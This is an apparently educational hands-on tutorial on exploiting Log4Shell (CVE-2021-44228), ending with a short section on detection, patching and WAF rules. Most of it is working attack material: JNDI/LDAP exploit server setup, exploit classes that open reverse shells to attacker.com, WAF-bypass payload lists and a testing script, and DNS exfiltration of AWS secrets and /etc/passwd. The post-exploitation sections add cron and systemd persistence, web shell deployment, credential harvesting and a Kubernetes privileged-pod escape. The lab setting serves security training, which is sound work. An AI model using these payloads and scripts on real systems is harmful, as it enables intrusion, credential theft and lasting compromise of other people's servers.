# 🚨 Log4Shell (CVE-2021-44228) Tutorial

**Difficulty**: ⭐⭐⭐⭐ (Intermediate)  
**Time Required**: 2 hours  
**Applications**: Log4Shell Lab, Spring Boot apps, custom Java apps

## 📚 Table of Contents
1. [What is Log4Shell?](#what-is-log4shell)
2. [How Log4Shell Works](#how-log4shell-works)
3. [JNDI and LDAP Basics](#jndi-and-ldap-basics)
4. [Hands-On Practice](#hands-on-practice)
5. [Detection and Mitigation](#detection-and-mitigation)
6. [Additional Resources](#additional-resources)

---

## 🎯 Learning Objectives

By the end of this tutorial, you will:
- ✅ Understand the Log4j vulnerability and its impact
- ✅ Exploit Log4Shell for remote code execution
- ✅ Set up LDAP/RMI servers for exploitation
- ✅ Bypass various WAF protections
- ✅ Detect and mitigate Log4Shell vulnerabilities

---

## What is Log4Shell?

Log4Shell (CVE-2021-44228) is a critical vulnerability in Apache Log4j 2, a popular Java logging library. It allows attackers to execute arbitrary code by injecting malicious JNDI lookups into log messages.

### 🎬 Real-World Impact

Log4Shell affected millions of systems worldwide:
- **Minecraft servers**: Mass exploitation for crypto mining
- **iCloud**: Apple's services were vulnerable
- **Steam**: Valve's gaming platform affected
- **AWS, Azure, Google Cloud**: Cloud services impacted
- **Tesla, Twitter, Cloudflare**: Major tech companies affected

**CVSS Score**: 10.0 (Critical)

### 🔍 Why So Devastating?

1. **Ubiquitous**: Log4j is used everywhere in Java ecosystem
2. **Easy to exploit**: Single string triggers RCE
3. **Deep in stack**: Embedded in many dependencies
4. **Logging everything**: User input often logged

---

## How Log4Shell Works

### The Vulnerable Code

```java
// Vulnerable Log4j usage
logger.info("User login: " + username);
logger.error("Invalid input: " + userInput);

// If userInput contains: ${jndi:ldap://evil.com/a}
// Log4j will make an LDAP request!
```

### Attack Flow

1. **Attacker** sends malicious payload: `${jndi:ldap://attacker.com/a}`
2. **Log4j** parses the lookup syntax `${...}`
3. **JNDI** makes request to attacker's LDAP server
4. **LDAP server** returns malicious Java object
5. **Application** executes attacker's code

### Affected Versions

- Log4j 2.0-beta9 to 2.14.1 (Fixed in 2.15.0, fully in 2.17.0)
- Java versions 6, 7, 8 allow full RCE
- Java 9+ requires additional gadgets

---

## JNDI and LDAP Basics

### What is JNDI?

Java Naming and Directory Interface - allows Java apps to look up resources:
- LDAP: `ldap://server/cn=admin`
- RMI: `rmi://server/object`
- DNS: `dns://server/example.com`

### LDAP Response Types

1. **Reference Result**: Points to remote codebase
2. **Serialized Object**: Contains malicious gadget
3. **JNDI Reference**: Loads remote class

---

## Hands-On Practice

### 🏃 Exercise 1: Basic Log4Shell Exploitation

**Setup**: Start the Log4Shell vulnerable app  
**Goal**: Achieve remote code execution

:::hint 💡 Hint 1: Find injection points
Look for any input that might be logged:
- User-Agent headers
- Form inputs
- URL parameters
- API request bodies
- Error messages

Try a test payload: `${java:version}`

:::

:::hint 💡 Hint 2: Set up LDAP server
You need an LDAP server that serves malicious responses. Tools:
- marshalsec
- JNDI-Injection-Exploit
- rogue-jndi

Or use a hosted service for testing.

:::

:::hint 💡 Hint 3: Craft the payload
Basic syntax:
```
${jndi:ldap://your-server:1389/Exploit}
```

Make sure your server is reachable from the target!

:::

:::hint 🔓 Hint 4
**Step 1**: Set up LDAP server
```bash
# Using marshalsec
git clone https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
     marshalsec.jndi.LDAPRefServer \
     "http://attacker.com:8000/#Exploit"

# Using JNDI-Exploit-Kit
wget https://github.com/pimps/JNDI-Exploit-Kit/releases/download/v1.2/JNDI-Exploit-Kit-1.2-SNAPSHOT.jar
java -jar JNDI-Exploit-Kit-1.2-SNAPSHOT.jar -L 0.0.0.0:1389 -P http://attacker.com:8000/
```

**Step 2**: Host exploit class
```java
// Exploit.java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("curl http://attacker.com/pwned");
            // Or reverse shell:
            // Runtime.getRuntime().exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'");
        } catch (Exception e) {}
    }
}
```

Compile and host:
```bash
javac Exploit.java
python3 -m http.server 8000
```

**Step 3**: Send payload
```bash
# In User-Agent
curl -H "User-Agent: \${jndi:ldap://attacker.com:1389/Exploit}" http://vulnerable-app.com

# In login form
username=${jndi:ldap://attacker.com:1389/Exploit}

# In search parameter
http://vulnerable-app.com/search?q=${jndi:ldap://attacker.com:1389/Exploit}
```

**Step 4**: Catch the callback
Monitor your web server and LDAP server logs for connections!

:::

---

### 🏃 Exercise 2: WAF Bypass Techniques

**Setup**: Target with WAF blocking "jndi" and "ldap"  
**Goal**: Bypass filtering and achieve RCE

:::hint 💡 Hint 1: Case variations
Log4j lookups are case-insensitive in some parts:
- `${jNdI:LdAp://...}`
- But not all parsers handle this the same way!

:::

:::hint 💡 Hint 2: Nested lookups
Log4j resolves lookups recursively:
```
${${lower:j}ndi:...}
${j${::-}ndi:...}
```

What other lookups can you nest?

:::

:::hint 💡 Hint 3: Alternative protocols
JNDI supports multiple protocols:
- ldap://
- ldaps://
- rmi://
- dns://

Some might not be filtered!

:::

:::hint 🔓 Hint 4
**Bypass Techniques**:

1. **Nested Variable Resolution**
```bash
# Using env variables
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attacker.com/a}

# Using lower/upper
${${lower:j}${lower:n}${lower:d}i:ldap://attacker.com/a}
${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://attacker.com/a}

# Using ::-
${j${::-}n${::-}d${::-}i${::-}:${::-}l${::-}d${::-}a${::-}p${::-}://attacker.com/a}

# Using date
${j${date:}ndi:ldap://attacker.com/a}
```

2. **Protocol Variations**
```bash
# RMI instead of LDAP
${jndi:rmi://attacker.com:1099/Exploit}

# DNS (for detection)
${jndi:dns://attacker.com}

# LDAPS
${jndi:ldaps://attacker.com:1389/Exploit}
```

3. **URL Encoding**
```bash
# URL encode special characters
${jndi:ldap://attacker.com:1389/Exp%6Coit}

# Double URL encoding
${jndi:ldap://attacker.com:1389/Ex%2570loit}
```

4. **Unicode Bypass**
```bash
# Unicode characters
${jndi:ldap://attacker.com:1389/\u0045xploit}
```

5. **Complex Obfuscation**
```bash
# Combining multiple techniques
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.com:1099/Exploit}

# Maximum obfuscation
${${env:BARFOO:-j}n${env:BARFOO:-d}i${env:BARFOO:-:}l${env:BARFOO:-d}a${env:BARFOO:-p}${env:BARFOO:-:}${env:BARFOO:-/}${env:BARFOO:-/}attacker.com${env:BARFOO:-:}1389${env:BARFOO:-/}Exploit}
```

**Testing Script**:
```python
payloads = [
    "${jndi:ldap://attacker.com/a}",
    "${${lower:j}ndi:ldap://attacker.com/a}",
    "${j${::-}ndi:ldap://attacker.com/a}",
    "${${env:ENV_NAME:-j}ndi:ldap://attacker.com/a}",
    "${jndi:rmi://attacker.com:1099/a}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}"
]

for payload in payloads:
    response = requests.get(url, headers={"User-Agent": payload})
    print(f"Payload: {payload[:30]}... - Status: {response.status_code}")
```

:::

---

### 🏃 Exercise 3: Exploiting Different Java Versions

**Setup**: Targets running Java 9+ with security restrictions  
**Goal**: Achieve RCE despite trustURLCodebase restrictions

:::hint 💡 Hint 1: Understanding the restriction
Java 9+ sets `com.sun.jndi.ldap.object.trustURLCodebase=false` by default.
This prevents loading classes from remote codebases.

What attack vectors remain?

:::

:::hint 💡 Hint 2: Local gadgets
Instead of remote classes, use classes already on the classpath:
- Tomcat BeanFactory
- Groovy
- Commons Configuration

Research "JNDI injection gadgets"

:::

:::hint 💡 Hint 3: Serialization attacks
If the app has gadget libraries:
- Commons Collections
- Spring
- Jackson

You might use deserialization!

:::

:::hint 🔓 Hint 4
**Method 1: Tomcat BeanFactory (requires Tomcat)**
```java
// LDAP server returns Reference with BeanFactory
Reference ref = new Reference("javax.el.ELProcessor",
    "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory", null);
ref.add(new StringRefAddr("forceString", "x=eval"));
ref.add(new StringRefAddr("x", 
    "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
    ".newInstance().getEngineByName(\"JavaScript\")" +
    ".eval(\"java.lang.Runtime.getRuntime().exec('calc')\")"
));
```

**Method 2: Using local classes**
```python
# Exploit using marshalsec with Tomcat
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
     marshalsec.jndi.LDAPRefServer \
     "http://localhost:8000/#Exploit" \
     1389 \
     "Tomcat"
```

**Method 3: Deserialization (if gadgets present)**
```java
// If Commons Collections is present
// Create ysoserial payload
java -jar ysoserial.jar CommonsCollections5 "curl http://attacker.com" > payload.ser

// Serve via LDAP as serialized object
// The JNDI lookup will deserialize it
```

**Method 4: DNS Exfiltration (when RCE fails)**
```bash
# Even if RCE fails, DNS lookups often work
${jndi:dns://data-here.attacker.com}

# Exfiltrate environment variables
${jndi:dns://${env:USER}.attacker.com}
${jndi:dns://${env:AWS_SECRET_ACCESS_KEY}.attacker.com}

# Exfiltrate system properties
${jndi:dns://${sys:user.name}.attacker.com}
${jndi:dns://${sys:java.version}.attacker.com}
```

**Universal Exploit Chain**:
```python
# 1. First, detect Java version
payload = "${java:version}"

# 2. If Java < 9, use remote codebase
if version < 9:
    payload = "${jndi:ldap://attacker.com:1389/Exploit}"

# 3. If Java >= 9, check for gadgets
else:
    # Try Tomcat BeanFactory
    payload = "${jndi:ldap://attacker.com:1389/TomcatBypass}"
    
    # Or try deserialization
    payload = "${jndi:ldap://attacker.com:1389/Deserialization}"
```

:::

---

### 🏃 Exercise 4: Post-Exploitation

**Setup**: You have RCE via Log4Shell  
**Goal**: Establish persistence and explore

:::hint 💡 Hint 1: Reverse shell stability
Initial RCE might be unstable. Establish a proper shell:
- Reverse TCP shell
- Web shell
- Scheduled task/cron

:::

:::hint 💡 Hint 2: Credential harvesting
Look for:
- Environment variables
- Configuration files
- Database credentials
- Cloud credentials

:::

:::hint 💡 Hint 3: Lateral movement
From the compromised server:
- Internal network scanning
- Other vulnerable services
- Shared credentials

:::

:::hint 🔓 Hint 4
**Stable Reverse Shell**:
```java
// Exploit.java with reverse shell
public class Exploit {
    static {
        try {
            String[] cmd = {"/bin/bash", "-c", 
                "exec 5<>/dev/tcp/attacker.com/4444;cat <&5 | " +
                "while read line; do $line 2>&5 >&5; done"};
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {}
    }
}
```

**Web Shell Deployment**:
```java
public class Exploit {
    static {
        try {
            // Download and deploy web shell
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c",
                "wget http://attacker.com/shell.jsp -O /opt/tomcat/webapps/ROOT/debug.jsp"
            });
        } catch (Exception e) {}
    }
}
```

**Persistence Script**:
```bash
#!/bin/bash
# Add to crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -

# Create systemd service
cat > /etc/systemd/system/debug.service << EOF
[Unit]
Description=Debug Service
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF

systemctl enable debug.service
systemctl start debug.service
```

**Credential Harvesting**:
```bash
# Environment variables
env | grep -i "pass\|key\|token\|secret"

# Configuration files
find / -name "*.properties" -o -name "*.yml" -o -name "*.xml" 2>/dev/null | 
    xargs grep -l "password\|jdbc\|key" 2>/dev/null

# AWS credentials
cat ~/.aws/credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Database configs
find / -name "application.properties" -exec grep -H "jdbc" {} \;

# History files
cat ~/.bash_history
cat ~/.mysql_history
```

:::

---

### 🏃 Challenge: Advanced Log4Shell Scenarios

**Goal**: Exploit complex real-world scenarios

:::hint 🎯 Hint 1
Target is in Docker/Kubernetes. How do you:
1. Escape the container?
2. Access other pods?
3. Reach the cloud metadata?

:::

:::hint 🎯 Hint 2
No reverse shell possible (egress filtering). How do you:
1. Exfiltrate data via DNS?
2. Use timing attacks?
3. Leverage error messages?

:::

:::hint 🔓 Hint 3
**Container Escape**:
```java
// Check if in container
public class Exploit {
    static {
        try {
            // Check for /.dockerenv
            File dockerenv = new File("/.dockerenv");
            if (dockerenv.exists()) {
                // In Docker, try to escape
                // 1. Mount host filesystem
                Runtime.getRuntime().exec("nsenter -t 1 -m -u -i -n -p bash");
                
                // 2. Exploit privileged container
                Runtime.getRuntime().exec("capsh --print | grep cap_sys_admin");
            }
        } catch (Exception e) {}
    }
}
```

**DNS Exfiltration**:
```java
public class Exploit {
    static {
        try {
            // Read sensitive file
            String data = new String(Files.readAllBytes(Paths.get("/etc/passwd")));
            
            // Encode and exfiltrate via DNS
            String encoded = Base64.getEncoder().encodeToString(data.getBytes());
            
            // Split into chunks (DNS label limit is 63 chars)
            for (int i = 0; i < encoded.length(); i += 60) {
                String chunk = encoded.substring(i, Math.min(i + 60, encoded.length()));
                InetAddress.getByName(chunk + ".data.attacker.com");
                Thread.sleep(100); // Avoid flooding
            }
        } catch (Exception e) {}
    }
}
```

**Kubernetes Exploitation**:
```bash
# From compromised pod
# 1. Access service account token
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export API="https://kubernetes.default.svc"

# 2. List pods
curl -k -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/default/pods

# 3. Create new privileged pod
cat > privpod.json << EOF
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {"name": "priv"},
  "spec": {
    "containers": [{
      "name": "priv",
      "image": "alpine",
      "command": ["sh", "-c", "sleep 3600"],
      "securityContext": {"privileged": true},
      "volumeMounts": [{
        "name": "host",
        "mountPath": "/host"
      }]
    }],
    "volumes": [{
      "name": "host",
      "hostPath": {"path": "/"}
    }]
  }
}
EOF

curl -k -X POST -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d @privpod.json \
     $API/api/v1/namespaces/default/pods
```

:::

---

## Detection and Mitigation

### 🛡️ Detection Methods

1. **Log Analysis**
```bash
# Search for Log4Shell patterns
grep -E '\$\{(jndi|lower|upper|env|sys|java|::|-)' /var/log/*.log

# More comprehensive regex
grep -E '\$\{[^}]*\$\{|::|[jJ][nN][dD][iI]:|[lL][dD][aA][pP]:|[rR][mM][iI]:' /var/log/*.log
```

2. **Network Monitoring**
- Outbound LDAP connections (port 389, 636)
- Outbound RMI connections (port 1099)
- DNS queries to unusual domains

3. **Scanner Tools**
```bash
# log4j-scan
python3 log4j-scan.py -u http://target.com

# Nuclei templates
nuclei -u http://target.com -t cves/2021/CVE-2021-44228.yaml
```

### 🛡️ Mitigation Strategies

1. **Immediate: Disable Lookups**
```bash
# JVM flag
-Dlog4j2.formatMsgNoLookups=true

# Environment variable
LOG4J_FORMAT_MSG_NO_LOOKUPS=true
```

2. **Best: Update Log4j**
```xml
<!-- Maven -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>
</dependency>
```

3. **Remove JNDI Lookup Class**
```bash
# Remove the vulnerable class
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

4. **WAF Rules**
```
# Block common patterns
${jndi:
${lower:
${upper:
${env:
${sys:
${::-
```

---

## 📊 Quick Reference

### Detection Patterns
```bash
# Basic
${jndi:ldap://
${jndi:rmi://
${jndi:dns://

# Obfuscated
${${::-j}${::-n}${::-d}${::-i}
${${lower:jndi}
${${env:BARFOO:-j}ndi

# Nested
${${::-${::-$${::-{::-j}}}}
```

### Exploitation Checklist
- [ ] Identify injection points
- [ ] Set up LDAP/RMI server
- [ ] Prepare exploit class
- [ ] Test basic payload
- [ ] Try bypass techniques
- [ ] Establish persistence
- [ ] Exfiltrate data

---

## 🏆 Skill Check

Before moving on, make sure you can:

- [ ] Understand JNDI injection mechanism
- [ ] Set up exploitation infrastructure
- [ ] Bypass WAF protections
- [ ] Exploit different Java versions
- [ ] Detect Log4Shell attempts
- [ ] Properly patch systems

---

## Additional Resources

### 🔧 Tools
- **log4shell-detector**: Vulnerability scanner
- **marshalsec**: LDAP/RMI exploit server
- **JNDI-Exploit-Kit**: All-in-one exploitation
- **log4j-scan**: Python scanner

### 📖 Further Reading
- [Apache Log4j Security](https://logging.apache.org/log4j/2.x/security.html)
- [LunaSec Log4Shell Guide](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [Swiss CERT Analysis](https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/)

### 🎥 Video Resources
- [LiveOverflow - Log4Shell Explained](https://www.youtube.com/watch?v=w2F67LbEtnk)
- [John Hammond - Log4Shell Deep Dive](https://www.youtube.com/watch?v=7qoPDq41xhQ)

---

**Next Tutorial**: [Spring4Shell (CVE-2022-22965)](spring4shell.md) → 